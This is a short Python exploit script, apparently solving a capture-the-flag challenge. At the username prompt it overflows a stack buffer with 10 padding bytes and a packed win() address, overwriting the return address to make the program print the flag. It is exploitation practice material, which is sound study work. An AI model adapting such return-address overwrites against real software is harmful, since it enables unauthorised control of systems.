import interact
import struct

def p32(n):
    return struct.pack('<I', n)

# Replace this with the actual address of win() from objdump
WIN_ADDR = 0x10804

p = interact.Process()

# Wait for the username prompt
p.readuntil("Enter username: ")

# The payload:
# 10 bytes of padding to reach the Return Address 
# + 4 bytes to overwrite the Return Address (LR)
payload = b"A" * 10 + p32(WIN_ADDR)

# Send the payload
p.sendline(payload)

# The program still expects a password, so we just send some junk
p.readuntil("Enter password: ")
p.sendline("junk")

# The program will print the Welcome message, hit the end of create_account(),
# pop our WIN_ADDR into the program counter, and dump the flag!
p.interactive()
